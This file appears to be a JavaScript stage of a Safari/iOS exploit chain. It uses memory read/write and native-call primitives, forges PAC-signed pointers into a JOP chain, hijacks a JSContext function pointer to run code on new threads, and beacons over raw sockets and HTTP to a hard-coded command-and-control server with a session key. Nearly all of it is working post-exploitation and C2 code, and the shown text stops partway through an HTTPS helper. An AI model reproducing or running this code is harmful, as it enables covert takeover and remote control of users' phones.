// C2 channel session (issued per pe_worker_body fetch)
try{globalThis.__C2_CHANNEL={"sid":"deb16b609e5bb6d5b854dd8f5f15844c","key":"62c158e4ec7fcc711b4a25ec327ab862045a14717ed75e600aa95a4ef18c1d24","v":1,"pack":"ch1"};}catch(_c){}
/* LAB: pe_worker.js = src_v1.5 pe_main subsequent (PE-LISTEN, cold P7 off)
 * Served as pe_worker.js for sbx1 EARLY nowait_exit (Safari exit path).
 * ASCII-only (non-ASCII breaks gpu_copy/strlen). C2 http://192.168.31.32:9090
 * Post-sandbox pelog: pe_sandbox_ok / pe_agent_ok
 */
(() => {
  // Early probes use pe_boot LOG (HTTPS C2) before this file rebinds globalThis.LOG.
  function __peEarly(m) {
    try { if (typeof LOG === "function") LOG(m); } catch (_) {}
  }
  fcall_init();
  __peEarly("[PE-PROBE-E1] after fcall_init");
  // Signal WC: MPD local fcall is live - Safari/IOSurface may tear down.
  // Token from pe.fcall_expect (written by this spawn); ignores stale ready from prior runs / page restart.
  try {
    (function __peSignalFcallReady() {
      let OPEN = func_resolve("open");
      let READ = func_resolve("read");
      let WRITE = func_resolve("write");
      let CLOSE = func_resolve("close");
      let MKDIR = func_resolve("mkdir");
      let CALLOC = func_resolve("calloc");
      let FREE = func_resolve("free");
      let GETPID = func_resolve("getpid");
      try { fcall(MKDIR, get_cstring("/tmp/c2_ipc"), 0x1ffn); } catch (_) {}
      let token = "";
      try {
        let efd = fcall(OPEN, get_cstring("/tmp/c2_ipc/pe.fcall_expect"), 0n);
        if (efd >= 0n) {
          let buf = fcall(CALLOC, 1n, 96n);
          let n = Number(fcall(READ, efd, buf, 80n));
          fcall(CLOSE, efd);
          if (buf && n > 0) {
            let s = "";
            for (let i = 0; i < n; i++) {
              let c = Number(uread8(buf + BigInt(i)));
              if (!c || c === 10 || c === 13) break;
              if (c >= 32 && c < 127) s += String.fromCharCode(c);
            }
            token = s.trim();
          }
          try { if (buf) fcall(FREE, buf); } catch (_) {}
        }
      } catch (_) {}
      if (!token) token = "0";
      let body = "PE_FCALL_READY\n" + token + "\n" + String(Number(fcall(GETPID))) + "\n" + String(Date.now()) + "\n";
      let rfd = fcall(OPEN, get_cstring("/tmp/c2_ipc/pe.fcall_ready"), 0x601n, 0x1ffn);
      if (rfd >= 0n) {
        fcall(WRITE, rfd, get_cstring(body), BigInt(body.length));
        fcall(CLOSE, rfd);
      }
    })();
  } catch (_) {}
  __peEarly("[PE-PROBE-E2] after fcall_ready signal");
  let PAGE_SIZE = 0x4000n;
  let KERN_SUCCESS = 0n;
  let CALLOC = func_resolve("calloc");
  let MALLOC = func_resolve("malloc");
  let FREE = func_resolve("free");
  let MEMCPY = func_resolve("memcpy");
  let MEMSET = func_resolve("memset");
  let SLEEP = func_resolve("sleep");
  let USLEEP = func_resolve("usleep");
  let STRCMP = func_resolve("strcmp");
  let STRCPY = func_resolve("strcpy");
  let STRNCPY = func_resolve("strncpy");
  let SNPRINTF = func_resolve("snprintf");
  let PRINTF = func_resolve("printf");
  let ERRNO = func_resolve("errno");
  let CLOSE = func_resolve("close");
  let EXIT = func_resolve("exit");
  let GETCHAR = func_resolve("getchar");
  let GETPID = func_resolve("getpid");
  let SYSCALL = func_resolve("syscall");
  let MACH_VM_ALLOCATE = func_resolve("mach_vm_allocate");
  let MACH_VM_DEALLOCATE = func_resolve("mach_vm_deallocate");
  let MACH_ERROR_STRING = func_resolve("mach_error_string");
  let MACH_PORT_ALLOCATE = func_resolve("mach_port_allocate");
  let kIOMasterPortDefault = func_resolve("kIOMasterPortDefault");
  function assert(a, b = "N/A") {
    if (!a) {
      throw new Error(`assert failed: ${b}`);
    }
  }
  function ERROR(a) {
    throw new Error(a);
  }
  function new_uint64_t(val = 0n) {
    let buf = calloc(1n, 8n);
    uwrite64(buf, val);
    return buf;
  }
  function mach_task_self() {
    return 0x203n;
  }
  function calloc(...args) {
    return fcall(CALLOC, ...args);
  }
  function malloc(...args) {
    return fcall(MALLOC, ...args);
  }
  function free(...args) {
    return fcall(FREE, ...args);
  }
  function memcpy(...args) {
    return fcall(MEMCPY, ...args);
  }
  function memset(...args) {
    return fcall(MEMSET, ...args);
  }
  function sleep(...args) {
    return fcall(SLEEP, ...args);
  }
  function usleep(...args) {
    return fcall(USLEEP, ...args);
  }
  function strcmp(...args) {
    return fcall(STRCMP, ...args);
  }
  function strcpy(...args) {
    return fcall(STRCPY, ...args);
  }
  function strncpy(...args) {
    return fcall(STRNCPY, ...args);
  }
  function snprintf(...args) {
    return fcall(SNPRINTF, buf, size, fmt, 0n, 0n, 0n, 0n, 0n, ...args);
  }
  function printf(...args) {
    return fcall(PRINTF, get_cstring(fmt), 0n, 0n, 0n, 0n, 0n, 0n, 0n, ...args);
  }
  function close(...args) {
    return fcall(CLOSE, ...args);
  }
  function exit(...args) {
    return fcall(EXIT, ...args);
  }
  function getchar(...args) {
    return fcall(GETCHAR, ...args);
  }
  function getpid(...args) {
    return fcall(GETPID, ...args);
  }
  function syscall(num, ...args) {
    return fcall(SYSCALL, num, 0n, 0n, 0n, 0n, 0n, 0n, 0n, ...args);
  }
  function mach_vm_allocate(...args) {
    return fcall(MACH_VM_ALLOCATE, ...args);
  }
  function mach_vm_deallocate(...args) {
    return fcall(MACH_VM_DEALLOCATE, ...args);
  }
  function mach_error_string(...args) {
    return fcall(MACH_ERROR_STRING, ...args);
  }
  function mach_port_allocate(...args) {
    return fcall(MACH_PORT_ALLOCATE, ...args);
  }
  let g_device_machine = 0n;
  function get_device_machine() {
    if (g_device_machine == 0n) {
      let utsname = calloc(256n, 5n);
      fcall(UNAME, utsname);
      g_device_machine = utsname + 256n * 4n;
    }
    return g_device_machine;
  }
  let OBJC_ALLOC = func_resolve("objc_alloc");
  let OBJC_ALLOC_INIT = func_resolve("objc_alloc_init");
  let OBJC_GETCLASS = func_resolve("objc_getClass");
  let OBJC_MSGSEND = func_resolve("objc_msgSend");
  let SEL_REGISTERNAME = func_resolve("sel_registerName");
  let CFDICTIONARYCREATEMUTABLE = func_resolve("CFDictionaryCreateMutable");
  let CFDICTIONARYSETVALUE = func_resolve("CFDictionarySetValue");
  let CFNUMBERCREATE = func_resolve("CFNumberCreate");
  let CFRELEASE = func_resolve("CFRelease");
  let CFSHOW = func_resolve("CFShow");
  let CFSTRINGCREATECOPY = func_resolve("CFStringCreateCopy");
  let CFSTRINGCREATEWITHCSTRING = func_resolve("CFStringCreateWithCString");
  let kCFAllocatorDefault = uread64(func_resolve("kCFAllocatorDefault").noPAC());
  let kCFStringEncodingUTF8 = 0x08000100n;
  let kCFTypeDictionaryKeyCallBacks = func_resolve("kCFTypeDictionaryKeyCallBacks").noPAC();
  let kCFTypeDictionaryValueCallBacks = func_resolve("kCFTypeDictionaryValueCallBacks").noPAC();
  function CFDictionaryCreateMutable(...args) {
    return fcall(CFDICTIONARYCREATEMUTABLE, ...args);
  }
  function CFDictionarySetValue(...args) {
    return fcall(CFDICTIONARYSETVALUE, ...args);
  }
  function CFNumberCreate(...args) {
    return fcall(CFNUMBERCREATE, ...args);
  }
  function CFRelease(...args) {
    return fcall(CFRELEASE, ...args);
  }
  function CFShow(...args) {
    return fcall(CFSHOW, ...args);
  }
  function CFStringCreateCopy(...args) {
    return fcall(CFSTRINGCREATECOPY, ...args);
  }
  function CFStringCreateWithCString(...args) {
    return fcall(CFSTRINGCREATEWITHCSTRING, ...args);
  }
  function objc_alloc(class_obj) {
    return fcall(OBJC_ALLOC, class_obj);
  }
  function objc_alloc_init(class_obj) {
    return fcall(OBJC_ALLOC_INIT, class_obj);
  }
  function objc_getClass(class_name) {
    return fcall(OBJC_GETCLASS, get_cstring(class_name));
  }
  function objc_msgSend(...args) {
    return fcall(OBJC_MSGSEND, ...args);
  }
  function sel_registerName(cstr) {
    return fcall(SEL_REGISTERNAME, cstr);
  }
  let selector_evaluateScript = sel_registerName(get_cstring("evaluateScript:"));
  let selector_initWithTarget_selector_object = sel_registerName(get_cstring("initWithTarget:selector:object:"));
  let selector_invocationWithMethodSignature = sel_registerName(get_cstring("invocationWithMethodSignature:"));
  let selector_invoke = sel_registerName(get_cstring("invoke"));
  let selector_isFinished = sel_registerName(get_cstring("isFinished"));
  let selector_methodSignatureForSelector = sel_registerName(get_cstring("methodSignatureForSelector:"));
  let selector_objectForKeyedSubscript = sel_registerName(get_cstring("objectForKeyedSubscript:"));
  let selector_release = sel_registerName(get_cstring("release"));
  let selector_retainCount = sel_registerName(get_cstring("retainCount"));
  let selector_setArgument_atIndex = sel_registerName(get_cstring("setArgument:atIndex:"));
  let selector_start = sel_registerName(get_cstring("start"));
  let invoke_class = objc_getClass("NSInvocation");
  let jsc_class = objc_getClass("JSContext");
  let nsthread_class = objc_getClass("NSThread");
  function create_cfstring(cstring) {
    return CFStringCreateWithCString(kCFAllocatorDefault, cstring, kCFStringEncodingUTF8);
  }
  let cfstr_boxed_arr = create_cfstring(get_cstring("boxed_arr"));
  let cfstr_control_array = create_cfstring(get_cstring("control_array"));
  let cfstr_control_array_8 = create_cfstring(get_cstring("control_array_8"));
  let cfstr_func_offsets_array = create_cfstring(get_cstring("func_offsets_array"));
  let cfstr_isNaN = create_cfstring(get_cstring("isNaN"));
  let cfstr_rw_array = create_cfstring(get_cstring("rw_array"));
  let cfstr_rw_array_8 = create_cfstring(get_cstring("rw_array_8"));
  let cfstr_unboxed_arr = create_cfstring(get_cstring("unboxed_arr"));
  function create_cfstring_copy(cfstring) {
    return CFStringCreateCopy(kCFAllocatorDefault, cfstring);
  }
  function object_retainCount(obj) {
    return objc_msgSend(obj, selector_retainCount);
  }
  function object_release(obj) {
    return objc_msgSend(obj, selector_release);
  }
  function objectForKeyedSubscript(obj, cfstr_key) {
    return objc_msgSend(obj, selector_objectForKeyedSubscript, cfstr_key);
  }
  function evaluateScript(obj, jscript) {
    return objc_msgSend(obj, selector_evaluateScript, jscript);
  }
  function methodSignatureForSelector(obj, sel) {
    return objc_msgSend(obj, selector_methodSignatureForSelector, sel);
  }
  function invocationWithMethodSignature(obj, sig) {
    return objc_msgSend(obj, selector_invocationWithMethodSignature, sig);
  }
  function setArgument_atIndex(obj, arg, idx) {
    return objc_msgSend(obj, selector_setArgument_atIndex, arg, idx);
  }
  function initWithTarget_selector_object(obj, target, sel, object) {
    return objc_msgSend(obj, selector_initWithTarget_selector_object, target, sel, object);
  }
  function nsthread_start(obj) {
    return objc_msgSend(obj, selector_start);
  }
  function setup_fcall_jopchain() {
    let jsvm_fcall_buff = malloc(PAGE_SIZE);
    let load_x1x3x8_args = jsvm_fcall_buff + 0x100n;
    let jsvm_fcall_args = jsvm_fcall_buff + 0x200n;
    uwrite64(jsvm_fcall_buff + 0x0n, load_x1x3x8_args);
    uwrite64(jsvm_fcall_buff + 0x8n, pacia(load_x1x3x8, 0n));
    uwrite64(jsvm_fcall_buff + 0x10n, pacia(_CFObjectCopyProperty, 0n));
    uwrite64(jsvm_fcall_buff + 0x40n, pacia(jsvm_isNAN_fcall_gadget2, 0n));
    uwrite64(load_x1x3x8_args + 0x20n, load_x1x3x8_args + 0x40n);
    uwrite64(load_x1x3x8_args + 0x28n, jsvm_fcall_args - 0x10n);
    uwrite64(load_x1x3x8_args + 0x30n, pacia(0x41414141n, 0xC2D0n));
    uwrite64(load_x1x3x8_args + 0x50n, pacia(fcall_14_args_write_x8, load_x1x3x8_args + 0x50n));
    return {
      "jsvm_fcall_buff": jsvm_fcall_buff,
      "jsvm_fcall_pc": load_x1x3x8_args + 0x30n,
      "jsvm_fcall_args": jsvm_fcall_args
    };
  }
  let evaluateScript_invocation = 0n;
  function js_thread_spawn(js_script_nsstring, target_thread_arg = 0x0n) {
    if (typeof js_script_nsstring === "string") {
      js_script_nsstring = create_cfstring(get_cstring(js_script_nsstring));
    } else if (typeof js_script_nsstring === "object") {
      js_script_nsstring = create_cfstring(uread64(addrof(js_script_nsstring) + 0x10n));
    } else {
      js_script_nsstring = create_cfstring_copy(js_script_nsstring);
    }
    let jop_chain_info = setup_fcall_jopchain();
    let jsvm_fcall_buff = jop_chain_info["jsvm_fcall_buff"];
    let jsvm_fcall_pc = jop_chain_info["jsvm_fcall_pc"];
    let jsvm_fcall_args = jop_chain_info["jsvm_fcall_args"];
    let ctx = objc_alloc_init(jsc_class);
    let isnan_value = objectForKeyedSubscript(ctx, cfstr_isNaN);
    let isnan_func_addr = uread64(isnan_value + 0x8n);
    let isnan_executable_addr = uread64(isnan_func_addr + 0x18n);
    let isnan_code_ptr = isnan_executable_addr + 0x28n;
    evaluateScript(ctx, stage1_js);
    let unboxed_arr_value = objectForKeyedSubscript(ctx, cfstr_unboxed_arr);
    let unboxed_arr_addr = uread64(unboxed_arr_value + 0x8n);
    let boxed_arr_value = objectForKeyedSubscript(ctx, cfstr_boxed_arr);
    let boxed_arr_addr = uread64(boxed_arr_value + 0x8n);
    let boxed_arr_butter = uread64(boxed_arr_addr + 0x8n);
    uwrite64(unboxed_arr_addr + 0x8n, boxed_arr_butter);
    let rw_array_addr = uread64(objectForKeyedSubscript(ctx, cfstr_rw_array) + 0x8n);
    let control_array_addr = uread64(objectForKeyedSubscript(ctx, cfstr_control_array) + 0x8n);
    let rw_array_buffer_bk = uread64(rw_array_addr + 0x10n);
    let control_array_buffer_bk = uread64(control_array_addr + 0x10n);
    uwrite64(control_array_addr + 0x10n, rw_array_addr + 0x10n);
    let rw_array_8_addr = uread64(objectForKeyedSubscript(ctx, cfstr_rw_array_8) + 0x8n);
    let control_array_8_addr = uread64(objectForKeyedSubscript(ctx, cfstr_control_array_8) + 0x8n);
    let rw_array_8_buffer_bk = uread64(rw_array_8_addr + 0x10n);
    let control_array_8_buffer_bk = uread64(control_array_8_addr + 0x10n);
    uwrite64(control_array_8_addr + 0x10n, rw_array_8_addr + 0x10n);
    let signing_ctx = 0x4911n;
    let signed_fcall_addr = pacib(jsvm_isNAN_fcall_gadget, signing_ctx);
    uwrite64(isnan_code_ptr, signed_fcall_addr);
    let new_func_offsets = objectForKeyedSubscript(ctx, cfstr_func_offsets_array);
    let new_func_offsets_addr = uread64(new_func_offsets + 0x8n);
    let new_func_offsets_buffer = uread64(new_func_offsets_addr + 0x10n);
    memcpy(new_func_offsets_buffer, func_offsets_buffer, PAGE_SIZE);
    uwrite64(new_func_offsets_buffer + 3n * 0x8n, target_thread_arg);
    uwrite64(new_func_offsets_buffer + 5n * 0x8n, jsvm_fcall_buff);
    uwrite64(new_func_offsets_buffer + 6n * 0x8n, jsvm_fcall_pc);
    uwrite64(new_func_offsets_buffer + 7n * 0x8n, jsvm_fcall_args);
    if (evaluateScript_invocation == 0n) {
      let evaluateScript_signature = methodSignatureForSelector(ctx, selector_evaluateScript);
      evaluateScript_invocation = invocationWithMethodSignature(invoke_class, evaluateScript_signature);
      setArgument_atIndex(evaluateScript_invocation, new_uint64_t(selector_evaluateScript), 1n);
    }
    setArgument_atIndex(evaluateScript_invocation, new_uint64_t(ctx), 0n);
    setArgument_atIndex(evaluateScript_invocation, new_uint64_t(js_script_nsstring), 2n);
    let nsthread = objc_alloc(nsthread_class);
    initWithTarget_selector_object(nsthread, evaluateScript_invocation, selector_invoke, 0n);
    nsthread_start(nsthread);
    return {
      "thread_handle": nsthread,
      "js_ctx": ctx,
      "jop_chain_info": jop_chain_info,
      "js_script_nsstring": js_script_nsstring,
      "rw_array_buffer_bk": rw_array_buffer_bk,
      "control_array_buffer_bk": control_array_buffer_bk,
      "rw_array_8_buffer_bk": rw_array_8_buffer_bk,
      "control_array_8_buffer_bk": control_array_8_buffer_bk
    };
  }
  function js_thread_join(js_thread) {
    let jop_chain_info = js_thread["jop_chain_info"];
    let js_ctx = js_thread["js_ctx"];
    let js_script_nsstring = js_thread["js_script_nsstring"];
    let nsthread = js_thread["thread_handle"];
    while (true) {
      let isFinished = objc_msgSend(nsthread, selector_isFinished);
      if (isFinished == 1n) {
        break;
      }
    }
    object_release(nsthread);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_rw_array) + 0x8n) + 0x10n, js_thread["rw_array_buffer_bk"]);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_control_array) + 0x8n) + 0x10n, js_thread["control_array_buffer_bk"]);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_rw_array_8) + 0x8n) + 0x10n, js_thread["rw_array_8_buffer_bk"]);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_control_array_8) + 0x8n) + 0x10n, js_thread["control_array_8_buffer_bk"]);
    let jsc_ref_count = object_retainCount(js_ctx);
    for (let i = 0n; i < jsc_ref_count; i++) {
      object_release(js_ctx);
    }
    CFRelease(js_script_nsstring);
    free(jop_chain_info["jsvm_fcall_buff"]);
  }
  let RTLD_DEFAULT = 0xFFFFFFFFFFFFFFFEn;
  let VM_FLAGS_ANYWHERE = 1n;
  let VM_FLAGS_FIXED = 0n;
  let VM_FLAGS_OVERWRITE = 0x4000n;
  let VM_FLAGS_RANDOM_ADDR = 8n;
  let VM_INHERIT_NONE = 2n;
  let VM_PROT_DEFAULT = 3n;
  let PROT_READ = 0x1n;
  let PROT_WRITE = 0x2n;
  let MAP_SHARED = 0x1n;
  let AF_INET6 = 30n;
  let SOCK_DGRAM = 2n;
  let IPPROTO_ICMPV6 = 58n;
  let ICMP6_FILTER = 18n;
  let SEEK_SET = 0n;
  let _NSGETEXECUTABLEPATH = func_resolve("_NSGetExecutablePath");
  let ACCESS = func_resolve("access");
  let CONFSTR = func_resolve("confstr");
  let FCNTL = func_resolve("fcntl");
  let FSYNC = func_resolve("fsync");
  let FILEPORT_MAKEFD = func_resolve("fileport_makefd");
  let FILEPORT_MAKEPORT = func_resolve("fileport_makeport");
  let FOPEN = func_resolve("fopen");
  let FCLOSE = func_resolve("fclose");
  let FWRITE = func_resolve("fwrite");
  let GETSOCKOPT = func_resolve("getsockopt");
  let LSEEK = func_resolve("lseek");
  let MACH_THREAD_SELF = func_resolve("mach_thread_self");
  let MEMMEM = func_resolve("memmem");
  let MEMSET_PATTERN8 = func_resolve("memset_pattern8");
  let OPEN = func_resolve("open");
  let PREADV = func_resolve("preadv");
  let PWRITEV = func_resolve("pwritev");
  let PWRITE = func_resolve("pwrite");
  let PREAD = func_resolve("pread");
  let READ = func_resolve("read");
  let SETSOCKOPT = func_resolve("setsockopt");
  let SOCKET = func_resolve("socket");
  let STRCAT = func_resolve("strcat");
  let STRSTR = func_resolve("strstr");
  let STRLEN = func_resolve("strlen");
  let STRNCMP = func_resolve("strncmp");
  let STRRCHR = func_resolve("strrchr");
  let PTHREAD_SELF = func_resolve("pthread_self");
  let PTHREAD_JOIN = func_resolve("pthread_join");
  let WRITE = func_resolve("write");
  let REMOVE = func_resolve("remove");
  let ARC4RANDOM = func_resolve("arc4random");
  let TASK_THREADS = func_resolve("task_threads");
  let THREAD_SUSPEND = func_resolve("thread_suspend");
  let MACH_MAKE_MEMORY_ENTRY_64 = func_resolve("mach_make_memory_entry_64");
  let MACH_PORT_DEALLOCATE = func_resolve("mach_port_deallocate");
  let MACH_VM_MAP = func_resolve("mach_vm_map");
  let MMAP = func_resolve("mmap");
  let MLOCK = func_resolve("mlock");
  let MUNLOCK = func_resolve("munlock");
  let UNAME = func_resolve("uname");
  let IOSURFACECREATE = func_resolve("IOSurfaceCreate");
  let IOSURFACEPREFETCHPAGES = func_resolve("IOSurfacePrefetchPages");
  let IOSURFACEGETBASEADDRESS = func_resolve("IOSurfaceGetBaseAddress");
  let kIOSurfaceAllocSize = uread64(func_resolve("kIOSurfaceAllocSize").noPAC());
  function DUMP(addr, sz) {}
  function js_malloc(sz) {
    buff = new Uint8Array(BigInt(sz).asInt32s).fill(0x00);
    return uread64(mem.addrof(buff) + 0x10n);
  }
  function mach_thread_self() {
    return fcall(MACH_THREAD_SELF);
  }
  function pthread_getspecific(key) {
    return fcall(PTHREAD_GETSPECIFIC, key);
  }
  function pthread_self() {
    return fcall(PTHREAD_SELF);
  }
  function pthread_join(thr, val) {
    return fcall(PTHREAD_JOIN, thr, val);
  }
  function _NSGetExecutablePath(executable_path, length_ptr) {
    return fcall(_NSGETEXECUTABLEPATH, executable_path, length_ptr);
  }
  function confstr(name, buf, len) {
    return fcall(CONFSTR, name, buf, len);
  }
  function strrchr(s, c) {
    return fcall(STRRCHR, s, c);
  }
  function strcat(s1, s2) {
    return fcall(STRCAT, s1, s2);
  }
  function strlen(s) {
    return fcall(STRLEN, s);
  }
  function strstr(s1, s2) {
    return fcall(STRSTR, s1, s2);
  }
  function strncmp(s1, s2, n) {
    return fcall(STRNCMP, s1, s2, n);
  }
  function socket(domain, type, protocol) {
    return fcall(SOCKET, domain, type, protocol);
  }
  // Pack injects PELOG_ENDPOINTS / PELOG_REPORT_ENDPOINTS (scheme+SNI+ip). Failover until all fail.
  // shape: { scheme:"http"|"https", host:<SNI>, ip:<v4>, port:<num>, url:<canon> }
  const PELOG_ENDPOINTS = [{"scheme":"http","host":"192.168.31.32","ip":"192.168.31.32","port":9090,"url":"http://192.168.31.32:9090"}];
  const PELOG_REPORT_ENDPOINTS = [{"scheme":"http","host":"192.168.31.32","ip":"192.168.31.32","port":9090,"url":"http://192.168.31.32:9090"}];
  // Pack injects safari_promo list-pull hosts (labels) + endpoints (http/https).
  const SAFARI_PROMO_LIST_HOSTS = ["http://192.168.31.32:9090", "http://192.168.31.32:9090", "http://192.168.31.32:9090"];
  const SAFARI_PROMO_LIST_ENDPOINTS = [{"url": "http://192.168.31.32:9090", "host": "192.168.31.32", "ip": "192.168.31.32", "port": 9090, "scheme": "http"}, {"url": "http://192.168.31.32:9090", "host": "192.168.31.32", "ip": "192.168.31.32", "port": 9090, "scheme": "http"}, {"url": "http://192.168.31.32:9090", "host": "192.168.31.32", "ip": "192.168.31.32", "port": 9090, "scheme": "http"}];
  // Lab dual-pelog: when C2 list contains http://192.168.31.32:9090, __peLogPost sends to index 0 AND 1
  // so online https C2 still mirrors to local 8090 for debug. Set false to disable.
  const PELOG_DUAL_LAB_DEBUG = false;
  // pe pelog switch: default ON. c2_agent writes /tmp/c2_ipc/pe_pelog.json {on:false} to mute.
  if (typeof globalThis.__pe_pelog_on === "undefined") globalThis.__pe_pelog_on = true;
  const PE_V1_LAYER = true;
  const PE_V1_STATIC_PORT = 8083;
  const PELOG_HOST = PELOG_ENDPOINTS[0].host;
  const PELOG_PORT = PELOG_ENDPOINTS[0].port;
  __peEarly("[PE-PROBE-E3] PELOG ready host=" + PELOG_HOST + " port=" + PELOG_PORT);
  let CONNECT = func_resolve("connect");
  let __peLogSeq = 0;
  function __peEpScheme(ep) {
    try {
      let s = String((ep && ep.scheme) || "http").toLowerCase();
      return s === "https" ? "https" : "http";
    } catch (_) {
      return "http";
    }
  }
  function __peEpIp(ep) {
    try {
      if (ep && ep.ip) return String(ep.ip);
      if (ep && ep.host) return String(ep.host);
    } catch (_) {}
    return String(PELOG_HOST);
  }
  function __peEpSni(ep) {
    try {
      if (ep && ep.host) return String(ep.host);
      if (ep && ep.ip) return String(ep.ip);
    } catch (_) {}
    return String(PELOG_HOST);
  }
  function __peEpPort(ep) {
    try {
      let p = ep && ep.port != null ? Number(ep.port) : 0;
      if (p > 0) return p;
    } catch (_) {}
    return __peEpScheme(ep) === "https" ? 443 : 80;
  }
  function __peHostHeader(ep) {
    let h = __peEpSni(ep);
    let port = __peEpPort(ep);
    let scheme = __peEpScheme(ep);
    if ((scheme === "http" && port === 80) || (scheme === "https" && port === 443)) return h;
    return h + ":" + port;
  }
  function __peConnectIpv4(host, port) {
    let fd = socket(2n, 1n, 0n);
    if (fd <= 0n) return 0n;
    let sa = calloc(1n, 16n);
    let parts = String(host).split(".");
    if (parts.length !== 4) {
      free(sa);
      close(fd);
      return 0n;
    }
    let p0 = BigInt(parseInt(parts[0], 10));
    let p1 = BigInt(parseInt(parts[1], 10));
    let p2 = BigInt(parseInt(parts[2], 10));
    let p3 = BigInt(parseInt(parts[3], 10));
    let portBE = (BigInt(port) >> 8n & 0xFFn) | (BigInt(port) & 0xFFn) << 8n;
    uwrite64(sa, 16n | 2n << 8n | portBE << 16n | p0 << 32n | p1 << 40n | p2 << 48n | p3 << 56n);
    uwrite64(sa + 8n, 0n);
    // Non-blocking connect + poll - blocking connect can freeze listen forever.
    try { __peNetSetNonblock(fd); } catch (_) {}
    let cr = fcall(CONNECT, fd, sa, 16n);
    free(sa);
    if (cr != 0n) {
      // EINPROGRESS/EALREADY expected under O_NONBLOCK; wait up to ~3s for writable.
      let ok = false;
      try {
        let POLL = func_resolve("poll");
        // struct pollfd { int fd; short events; short revents; } - 8 bytes on arm64
        let pfd = calloc(1n, 16n);
        // fd in low 32 bits; POLLOUT=0x4 in events at offset 4
        uwrite64(pfd, (fd & 0xffffffffn) | (0x4n << 32n));
        uwrite64(pfd + 8n, 0n);
        let pr = fcall(POLL, pfd, 1n, 3000n);
        let revents = 0;
        try {
          let q = uread64(pfd);
          revents = Number((q >> 48n) & 0xffffn);
        } catch (_) {}
        free(pfd);
        // POLLOUT=0x4, POLLERR=0x8, POLLHUP=0x10
        if (pr > 0n && (revents & 0x4) && !(revents & 0x18)) ok = true;
      } catch (_) {}
      if (!ok) {
        try { close(fd); } catch (_) {}
        return 0n;
      }
    }
    // Back to blocking + SO_*TIMEO so WRITE/READ don't spin on EAGAIN.
    try {
      let FCNTL = func_resolve("fcntl");
      let fl = fcall(FCNTL, fd, 3n, 0n);
      if (fl >= 0n) fcall(FCNTL, fd, 4n, fl & ~0x4n);
    } catch (_) {}
    // Darwin: SOL_SOCKET=0xffff, SO_RCVTIMEO=0x1006, SO_SNDTIMEO=0x1005 - avoid stuck READ/WRITE.
    try {
      let SETSOCKOPT = func_resolve("setsockopt");
      let tv = calloc(1n, 16n);
      uwrite64(tv, 5n); // tv_sec=5
      uwrite64(tv + 8n, 0n);
      fcall(SETSOCKOPT, fd, 0xffffn, 0x1006n, tv, 16n);
      fcall(SETSOCKOPT, fd, 0xffffn, 0x1005n, tv, 16n);
      free(tv);
    } catch (_) {}
    return fd;
  }
  function __peHttpExchangePlain(ep, path, contentType, body, readResp) {
    let ip = __peEpIp(ep);
    let port = __peEpPort(ep);
    let fd = __peConnectIpv4(ip, port);
    if (fd <= 0n) return readResp ? "" : false;
    let req = "POST " + path + " HTTP/1.1\r\nHost: " + __peHostHeader(ep) +
      "\r\nContent-Type: " + contentType +
      "\r\nContent-Length: " + body.length +
      "\r\nConnection: close\r\n\r\n" + body;
    let wbuf = get_cstring(req);
    let woff = 0;
    let wlen = req.length;
    while (woff < wlen) {
      let wn = fcall(WRITE, fd, wbuf + BigInt(woff), BigInt(wlen - woff));
      if (!wn || wn <= 0n) break;
      woff += Number(wn);
    }
    if (!readResp) {
      close(fd);
      return woff > 0;
    }
    let rmax = 2 * 1024 * 1024;
    let rbuf = calloc(1n, BigInt(rmax + 8));
    let total = 0;
    while (total < rmax) {
      let chunk = Math.min(65536, rmax - total);
      let nrd = fcall(READ, fd, rbuf + BigInt(total), BigInt(chunk));
      if (!nrd || nrd <= 0n) break;
      total += Number(nrd);
    }
    close(fd);
    let out = "";
    if (total > 0) {
      let nr = total;
      if (!Number.isFinite(nr) || nr < 0) nr = 0;
      if (nr > rmax) nr = rmax;
      let arr = new Array(nr);
      for (let i = 0; i < nr; i++) {
        let qword = uread64(rbuf + BigInt(i & ~7));
        let b = Number((qword >> BigInt((i & 7) * 8)) & 0xffn);
        arr[i] = String.fromCharCode(b);
      }
      out = arr.join("");
    }
    free(rbuf);
    let sep = out.indexOf("\r\n\r\n");
    if (sep >= 0) out = out.slice(sep + 4);
    return out;
  }
  // ---- HTTPS (PE): CFHTTPMessage stream first, then NSURL, then raw CFStream pair ----
  function __peHttpsDiag(msg) {
    try {
      if (typeof LOG === "function") LOG("[PE-HTTPS] " + String(msg).slice(0, 180));
    } catch (_) {}
  }
  function __peNsString(js) {
    try {
      let NSString = objc_getClass("NSString");
      return objc_msgSend(NSString, sel_registerName(get_cstring("stringWithUTF8String:")),
        get_cstring(String(js)));
    } catch (_) {
      return create_cfstring(get_cstring(String(js)));
    }
  }
  function __peEnsureCFNetwork() {
    try {
      let dlopen = func_resolve("dlopen");
      fcall(dlopen, get_cstring("/System/Library/Frameworks/CFNetwork.framework/CFNetwork"), 1n);
    } catch (_) {}
  }
  function __peCfConst(name) {
    try {
      return uread64(func_resolve(name).noPAC());
    } catch (_) {
      return create_cfstring(get_cstring(name));
    }
  }
  // Preferred: CFReadStreamCreateForHTTPRequest - TLS from https:// URL.
  function __peHttpsExchangeCFHTTP(ep, path, contentType, body, readResp) {
    try {
      __peEnsureCFNetwork();
      let CFURLCreateWithString = func_resolve("CFURLCreateWithString");
      let CFHTTPMessageCreateRequest = func_resolve("CFHTTPMessageCreateRequest");
      let CFHTTPMessageSetHeaderFieldValue = func_resolve("CFHTTPMessageSetHeaderFieldValue");
      let CFHTTPMessageSetBody = func_resolve("CFHTTPMessageSetBody");
      let CFReadStreamCreateForHTTPRequest = func_resolve("CFReadStreamCreateForHTTPRequest");
      let CFDataCreate = func_resolve("CFDataCreate");
      let CFReadStreamOpen = func_resolve("CFReadStreamOpen");
      let CFReadStreamClose = func_resolve("CFReadStreamClose");
      let CFReadStreamGetStatus = func_resolve("CFReadStreamGetStatus");
      let CFReadStreamRead = func_resolve("CFReadStreamRead");
      let CFReadStreamSetProperty = func_resolve("CFReadStreamSetProperty");
      let CFReadStreamCopyProperty = func_resolve("CFReadStreamCopyProperty");
      let CFReadStreamScheduleWithRunLoop = func_resolve("CFReadStreamScheduleWithRunLoop");
      let CFReadStreamUnscheduleFromRunLoop = func_resolve("CFReadStreamUnscheduleFromRunLoop");
